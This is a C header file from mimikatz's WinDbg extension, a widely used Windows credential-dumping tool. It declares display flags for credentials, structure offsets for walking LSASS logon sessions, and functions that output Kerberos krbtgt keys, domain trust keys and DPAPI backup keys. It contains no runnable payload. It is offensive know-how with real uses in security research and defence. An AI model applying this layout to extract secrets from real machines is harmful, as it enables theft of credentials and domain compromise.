/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#pragma once
#include "kuhl_m_sekurlsa_utils.h"
#include "kuhl_m_sekurlsa_nt6.h"
#include "kuhl_m_sekurlsa_packages.h"
#define DELAYIMP_INSECURE_WRITABLE_HOOKS
#include <delayimp.h>

USHORT NtBuildNumber;

#define KUHL_SEKURLSA_CREDS_DISPLAY_RAW					0x00000000
#define KUHL_SEKURLSA_CREDS_DISPLAY_LINE				0x00000001
#define KUHL_SEKURLSA_CREDS_DISPLAY_NEWLINE				0x00000002

#define KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL			0x08000000
#define KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY				0x01000000
#define KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY		0x02000000
#define KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL_MASK		0x07000000

#define KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10			0x00100000
#define KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST			0x00200000
#define KUHL_SEKURLSA_CREDS_DISPLAY_CREDMANPASS			0x00400000
#define KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE				0x00800000
#define KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10_1607	0x00010000

#define KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT			0x10000000
#define KUHL_SEKURLSA_CREDS_DISPLAY_WPASSONLY			0x20000000
#define KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN				0x40000000
#define KUHL_SEKURLSA_CREDS_DISPLAY_SSP					0x80000000

#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
#define SECDATA_KRBTGT_OFFSET	39
#elif defined _M_IX86
#define SECDATA_KRBTGT_OFFSET	47
#endif

typedef void (CALLBACK * PKUHL_M_SEKURLSA_PACKAGE_CALLBACK) (IN ULONG_PTR pKerbGlobalLogonSessionTable, IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData);

typedef struct _KUHL_M_SEKURLSA_PACKAGE {
	const char * name;
	const char * symbolName;
	ULONG_PTR symbolPtr;
	const PKUHL_M_SEKURLSA_PACKAGE_CALLBACK callback;
} KUHL_M_SEKURLSA_PACKAGE, *PKUHL_M_SEKURLSA_PACKAGE;

typedef struct _KUHL_M_SEKURLSA_ENUM_HELPER {
	ULONG tailleStruct;
	ULONG offsetToLuid;
	ULONG offsetToLogonType;
	ULONG offsetToSession;
	ULONG offsetToUsername;
	ULONG offsetToDomain;
	ULONG offsetToCredentials;
	ULONG offsetToPSid;
	ULONG offsetToCredentialManager;
	ULONG offsetToLogonTime;
	ULONG offsetToLogonServer;
} KUHL_M_SEKURLSA_ENUM_HELPER, *PKUHL_M_SEKURLSA_ENUM_HELPER;

LPEXT_API_VERSION WDBGAPI kdbg_ExtensionApiVersion(void);
VOID WDBGAPI kdbg_WinDbgExtensionDllInit (PWINDBG_EXTENSION_APIS lpExtensionApis, USHORT usMajorVersion, USHORT usMinorVersion);
DECLARE_API(kdbg_coffee);
DECLARE_API(kdbg_mimikatz);

VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, PLUID luid, ULONG flags);
VOID kuhl_m_sekurlsa_genericKeyOutput(struct _KIWI_CREDENTIAL_KEY * key);
VOID kuhl_m_sekurlsa_genericLsaIsoOutput(struct _LSAISO_DATA_BLOB * blob);
VOID kuhl_m_sekurlsa_genericEncLsaIsoOutput(struct _ENC_LSAISO_DATA_BLOB * blob, DWORD size);
void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, LPCSTR prefix);
void kuhl_m_sekurlsa_krbtgt_trust(ULONG_PTR addr);
void kuhl_m_sekurlsa_trust_domainkeys(struct _KDC_DOMAIN_KEYS_INFO * keysInfo, PCSTR prefix, BOOL incoming, PUNICODE_STRING domain);
void kuhl_m_sekurlsa_trust_domaininfo(struct _KDC_DOMAIN_INFO * info);
void kuhl_sekurlsa_dpapi_backupkeys();

#define PVK_FILE_VERSION_0				0
#define PVK_MAGIC						0xb0b5f11e // bob's file
#define PVK_NO_ENCRYPT					0
#define PVK_RC4_PASSWORD_ENCRYPT		1
#define PVK_RC2_CBC_PASSWORD_ENCRYPT	2

typedef struct _PVK_FILE_HDR {
	DWORD	dwMagic;
	DWORD	dwVersion;
	DWORD	dwKeySpec;
	DWORD	dwEncryptType;
	DWORD	cbEncryptData;
	DWORD	cbPvk;
} PVK_FILE_HDR, *PPVK_FILE_HDR;

#define KULL_M_WIN_BUILD_XP		2600
#define KULL_M_WIN_BUILD_2K3	3790
#define KULL_M_WIN_BUILD_VISTA	6000
#define KULL_M_WIN_BUILD_7		7600
#define KULL_M_WIN_BUILD_8		9200
#define KULL_M_WIN_BUILD_BLUE	9600
#define KULL_M_WIN_BUILD_10_1507		10240
#define KULL_M_WIN_BUILD_10_1511		10586
#define KULL_M_WIN_BUILD_10_1607		14393

#define KULL_M_WIN_MIN_BUILD_XP		2500
#define KULL_M_WIN_MIN_BUILD_2K3	3000
#define KULL_M_WIN_MIN_BUILD_VISTA	5000
#define KULL_M_WIN_MIN_BUILD_7		7000
#define KULL_M_WIN_MIN_BUILD_8		8000
#define KULL_M_WIN_MIN_BUILD_BLUE	9400
#define KULL_M_WIN_MIN_BUILD_10		9800